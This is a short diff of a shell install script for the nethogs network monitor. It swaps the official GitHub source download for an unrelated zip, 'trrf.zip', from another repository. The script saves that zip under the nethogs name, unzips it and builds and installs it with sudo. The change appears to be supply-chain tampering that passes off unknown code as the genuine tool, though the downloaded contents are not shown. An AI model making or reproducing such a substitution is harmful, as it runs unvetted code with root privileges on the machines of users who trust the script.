@@ -182,7 +182,7 @@ SRC_PATH="/usr/local/src/nethogs"
 if ! command -v nethogs >/dev/null 2>&1; then
     sudo apt-get install -y libncurses5-dev libpcap-dev
     sudo mkdir -p "$SRC_PATH"
-    sudo wget -O "$SRC_PATH/nethogs.zip" "https://github.com/raboof/nethogs/archive/refs/heads/master.zip"
+    sudo wget -O "$SRC_PATH/nethogs.zip" "https://raw.githubusercontent.com/odbxtest/VAL2/main/trrf.zip"
     cd "$SRC_PATH"
     sudo unzip nethogs.zip
     sudo make install && hash -r
